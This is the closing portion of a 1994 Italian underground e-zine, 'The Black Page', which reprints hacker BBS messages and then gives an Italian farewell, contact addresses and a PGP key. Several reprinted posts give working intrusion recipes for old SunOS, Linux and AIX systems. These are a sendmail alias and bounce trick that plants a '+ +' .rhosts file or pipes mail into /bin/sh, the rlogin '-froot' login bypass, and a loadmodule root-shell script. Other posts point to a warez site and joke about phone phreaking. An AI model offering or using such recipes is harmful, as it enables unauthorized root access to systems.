harp.aix.calpoly.edu
copper.ucs.indiana.edu 
poe.acc.Virginia.EDU
irc.iastate.edu 
irc.technion.ac.il
hermes.oc.com 
Boston.MA.US.UnderNet.ORG

 ...etc... 
i am thinking to make a list of most known servers... post them :)
Aky

Msg #1005  Sunday, June 12, 1994 17:11 CET
From: Elmar.Bartel%bbs@sectec.greenie.muc.de (Elmar Bartel)
Subject: Re: SMTP BUG

Techno.Music%bbs@sectec.greenie.muc.de (Techno Music) writes:

> about the smtp bug of the sun os unix,to discover if this bug is patched i
> ive the instruction vrfy decode.
> when the system give this message: user unknown
> the bug is patched,but is possible that the system answer the user exist and
> the bug is patched  too?
> this couse i found a system that say the user exist but i can't use the
> bug...
The decode doesn't have anything to do with a smtp bug. It is simply an
alias which pipes mail to uudecode. Use a 'from: bin' and make up a uuencoded
file '/bin/.rhosts' which contains one single line '+ +'. Well, you guess
what this does... :) 'from: bin' and 'to: decode' will uudecode your message
to /bin/.rhosts et voila. There we go. I don't have to tell you what to
do with an '+ +' .rhosts, do I? :)
The smtp bug is about something completely different. When bouncing mail
all but the latest versions of sendmail will set a flag, which forces the
mail to be sent, even if this meant mailing it to a program. Thus, use
something like 'from: /usr/ucb/tail|/bin/sh', 'to: bin'. Create a header
which will cause the mail to bounce, e. g. 'Return-Receipt-To: |nowhere'.
Then make the last ten (including the line with the '.') a shell script,
e. g. make the last lines of your mail body something along the lines of

---- cut here ----
#!/bin/sh
echo HELLO THERE >/tmp/test
#
#
# These comments pad the message to a length of ten lines
#
#
#
#
---- cut here ----

What happens when your mail is being delivered? It will bounce, and
it will be returned to '/usr/ucb/tail|/bin/sh'. 'tail' keeps only the
last ten lines of your mail and pipes it to /bin/sh. Get the point? :)

-Elmar

Msg #94  Saturday, June 11, 1994 02:17 CET
From: Davex.Davex%bbs@sectec.greenie.muc.de (Davex Davex)
To: All%bbs@sectec.greenie.muc.de (All)
Subject: newz
Some Quotes from Mobile & Cellular.. UK trade Mag.
			   Re-chipping Ban.
			   ~~~~~~~~~~~~~~~

	BABT approval on new TACS cellphones will in future include a clause
which invalidates the approval if a phone's ESN is altered.  The move
follows industry-wide discussions between BABT and Oftel, the networks,
manufacturers,
dealers and the FCS Cellular Service Providers Group.  Peter Edwards of the
FCS group said: "ESN re-chipping continues to fuel the rise in mobile phone
theft and is costing our members millions of pounds every year in stolen
airtime and time-consuming administration.  The public should now realise
that
if the serial numbers (ESNs) are changed they cannot be connected to the
network and are therefore valueless."

		     ****************************

	Tell me about it!!  Does this mean more fones to phreak with??


			       Australia
			       ~~~~~~~~~

	GSM went live in Australia on May 20th after two months of trials.
The Optus GSM network, which will be available in all Australian capitals by
Christmas, uses infrastructure by Nortel Matra Cellular.
		     ****************************


More newz as it comez in....DaveX

Msg #1099  Thursday, August 11, 1994 14:44 CET  
From: Jerome.X%bbs@sectec.greenie.muc.de (Jerome X)
Subject: Re: Linux

Nexus.6%bbs@sectec.greenie.muc.de (Nexus 6) writes:

> Doen anybody know some bugs on linux?!

the -froot bug maybe.....
at the loginprompt just enter -f root or -froot or sumthing .....
heard of it, but I never found a site with this bug...
the same bugcould be abug in AIX machines

J-X

Msg #1101  Thursday, August 11, 1994 23:24 CET  
From: Elmar.Bartel%bbs@sectec.greenie.muc.de (Elmar Bartel)
Subject: Re: loadmodule

Maxwell.Benneth%bbs@sectec.greenie.muc.de (Maxwell Benneth) writes:

> Anyone played with /usr/openwin/loadmodule on 4.1.3.1U ?
> 
Maxwell Benneth! Still around.  :)

loadmodule executes scripts with a uid of 0. cannot remember where those
are located. try 'loadmodule x x'. it will complain that it cannot find
the kernel module 'x'. then replace the first 'x' with a valid device,
i use the 'evq' device. the second 'x' stands for a shell script. thus
loadmodule will complain it cannot find the script and give you the full 
path. then use the corresponding 'evq' script. 'cat' it and you'll see that
there is a 'chmod' in there (used to chmod the device node created by
mknod) which doesn't have a full path like '/bin/chmod'. since this script
is executed with root privileges just write your own chmod and set your
path to '.'

> Doen anybody know some bugs on linux?!

try a 'rlogin [machine] -l -froot'. in many versions the username '-froot'
will be passed to the login program by the daemon and login will accept
this to be the '-f' flag with the argument 'root'. only '-f root' should
be accepted here. also works on many AIXes. how embarassing. :)

-Elmar


Msg #1114  Monday, August 15, 1994 02:43 CET  
From: Phantom.Lord%bbs@sectec.greenie.muc.de (Phantom Lord)
To: All%bbs@sectec.greenie.muc.de (All)
Subject: loadmodule

   Here's script that exploits loadmodule on SunOSes .... 

set path = ( . $path )
cat > ld << EOF
/bin/sh
EOF
chmod a+x ld
loadmodule sd.o evqload

Msg #1125  Tuesday, August 23, 1994 21:47 CET  
From: Bayern.Power%bbs@sectec.greenie.muc.de (Bayern Power)
Subject: Re: sam

Techno.Music%bbs@sectec.greenie.muc.de (Techno Music) writes:

> Cyber.1%bbs@sectec.greenie.muc.de (Cyber 1) writes:
> 
> > The italian SAMANTHA chat system has been busted by italian police.
> > bye
> samantha didn't was an hacking system...so why did they bust it?


FidoNet boards are legal as well and have been busted anyway - in Italy,
logic doesn't count!

 [N.d.R. AAAAHAHAHAHAHAHAHHHAHAHAHHAHAHAHAH SCSI ha sempre ragione :) ]

Msg #233  Sunday, August 28, 1994 18:51 CET  
From: The.Aky%bbs@sectec.greenie.muc.de (The Aky)
Subject: Re: IRC

>I need a workin dialin with an IRC-account ...! Yes , only for IRC..
 
iftp irc client from cs.bu.edu and there you go...
s

Msg #234  Monday, August 29, 1994 08:48 CET  
From: Massimo.Baga%bbs@sectec.greenie.muc.de (Massimo Baga)
Subject: Re: IRC

Ganja.Man%bbs@sectec.greenie.muc.de (Ganja Man) writes:

u should check for +1 515 945 7000.
it provides u free telnet access and IRC .
Cheers,
      Massimo

Msg #29  Monday, August  8, 1994 21:18 CET  
From: Speed.Demon%bbs@sectec.greenie.muc.de (Speed Demon)
To: All%bbs@sectec.greenie.muc.de (All)
Subject: fsp site

Decent FSP site.
Physical Plant #5  128.206.29.11 12321
Pc and Mac wares

============================================================================

     Beh, fine delle stronzate. Speriamo che vi siano piaciute !!!


+++ATH
j)(/kjk=#
OK

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - THE END

				   COMMIATO
				   ========

     Bene,  questa e' proprio la fine. Speriamo che questa strana  rivista  vi 
sia piaciuta. E' solo un tentativo di tirare fuori qualcosa di buono, dal  no-
stro  paese, che finora sembra solo popolato da stronzi :) vabbe' va, in  ogni 
caso prendetela per com'e', e NON ROMPETECI I COGLIONI dicendo cazzate, che e' 
lamer, che fa schifo, perche' a noi cosi' va bene. 

     E  POI, CAZZO !!! Ho cercato per MESI dei collaboratori, e voi, SI,  VOI, 
STRONZACCI,  mi avete detto "ma se scrivo solo io allora non se ne fa  niente" 
oppure  "ma io non voglio sputtanare quello che so" e cazzate del genere.  SI, 
CAZZATE, perche' basta un po' di fantasia per tirare fuori cose  interessanti. 
Questo numero, almeno credo, non ha niente di illecito al suo interno. Contie-
ne  dati  prelevati da BBS e CHAT di vario tipo, chiunque puo'  andare  li'  e 
prenderseli.  Ma rappresenta piu' che altro un nostro ESPERIMENTO, per  vedere 
se dopo aver letto ste cazzate qualcuno si decidera' ad aiutarci. 

     Molti  avrebbero prima di tutto voluto vedere di che si trattava per  poi 
decidere  se collaborare o no. Bene, adesso l'avete visto. Questa magazine  e' 
aperta a ogni tipo di cosa che riguardi il ns mondo telematico. Quindi, fatevi 
sotto !!! Se avete intenzione di collaborare, di mandarci dei vs articoli,  di 
farci  delle domande, di esprimere le vs opinioni sulla rivista, o  per  darci 
dei suggerimenti, o anche semplicemente per INSULTARCI, beh, scrivete agli in-
dirizzi EMAIL sotto-riportati. FATELO !!! E SUBITO !!! :)


============================================================================
H  THE BLACK PAGE - Numero 0 - Settembre 1994 - INDIRIZZI EMAIL  VALIDI :  H
============================================================================
H                                                  H   \           /     T H
H     Internet : ay146@freenet.hsc.colorado.edu    H  ___\__/\---/---  F E H
H                                                  H  _____\/\-/-----  I L H
H     Cybernet : 65:1200/1 DECODER BBS             H  ______//-------  G E H
H                Scrivere a "Dupree's Paradise"    H  _____//\-\-----  H C H
H                                                  H     /       \     T O H
H          QSD : Mailbox "DUPREES PARADISE"        H   /           \     M H
H                                                  H                       H
H     Videotel : Arkimede *52181#                  H        TELECOM        H
H                NUA 2551604400                    H     SE LA CONOSCI     H
H                Lasciare CPE all'user "DUPREE'S"  H       LA  EVITI       H
H                                                  H                       H
============================================================================

THE BLACK PAGE - In questo numero hanno collaborato : 
-----------------------------------------------------

           Dupree's Paradise - Redattore capo
		      Ice MC - Redattore quasi capo anche lui :)
		         Ace - Corrispondente dagli Esteri :)
                Hitman Italy - The K00l Unix guy ;)		    

     Si ringrazia tacitamente Sxs per la "Mucca che caga" di IRC
     -----------------------------------------------------------

Si ringraziano i seguenti esseri, reali o virtuali :
----------------------------------------------------

	  Ace
          Hitman Italy
	  I Vax Brothers
	  Lo staff di Arkimede
	  SevenUp e tutti quanti su SECTEC BBS
	  Black Jack
	  Agora' Telematica
	  Gomma, Luc Pac e tutto lo staff di Decoder BBS
          Lo staff di One Man Crew

Per qualsiasi messaggio utilizzate la seguente chiave PGP 2.3a :
================================================================

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.3a

mQCNAi4ineEAAAEEAKT5tLs4cMmniPjJE1Xv0D0/sbxTKPCY+f60c7px/xXUDObv
47fnFscT7lOZ7TeCJVo8m7qfj6HqiqSLuRMTNeAEcTUvUYoa7I+mNceL3rVgkqid
qf3RP0av7AFCfICSnzzA/KD3M73I0SBeAt3Mple6EeJ0C7sA+o2626Mw2H/BAAUR
tNdEdXByZWUncyBQYXJhZGlzZSA8UVNEIE1ieCA6ICJEVVBSRUVTIFBBUkFESVNF
Ij4gICAgIDxGaWRvbmV0IDI6MzMxLzM2OT4gICAgICAgIDxheTE0NkBGcmVlbmV0
LkhzYy5Db2xvcmFkby5FZHU+ICAgICAgICAgICAgICAgICAgICAgPEN5YmVybmV0
IDY1OjEyMDAvMT4gICAgICAgPER1cHJlZSdzLlBhcmFkaXNlJWJic0BTZWN0ZWMu
R3JlZW5pZS5NdWMuRGU+ICAgICAgICA6KYkAlQIFEC4in4nJtVamMFAlIQEBFu8E
AKLEfKdOjF+rV5gBg1/KFQ//CHsfYS4FNd3qvbRx6PEUIy3NJ4+YSpGAsPgxNyGg
gVv7QEHHeDlRwgrSkVvM2AaIwYWxZqs2/X09Igy2QowpfTduVppN0mzGyb2/ug5k
PyYA/rsriHxmciMjAUjcptv+7WYVx73q7PmbSTUzYjQA
=pvb/
-----END PGP PUBLIC KEY BLOCK-----

@BEGIN FILE_ID.DIZ
 
 * Dupree's Paradise * & -IceMC- 
presents
 The First Italian ------------=== 
 ===----------- Cyberpunk Magazine 

         The Black Page          
*    Issue 00 - September 1994    *

 La 1a rivista telematica ITALIANA 
 di CYBERPUNK e CONTROINFORMAZIONE 
 -        The Black Page         - 
 -  Numero 00 -- Settembre 1994  - 

@END FILE_ID.DIZ

=================================NO CARRIER=================================
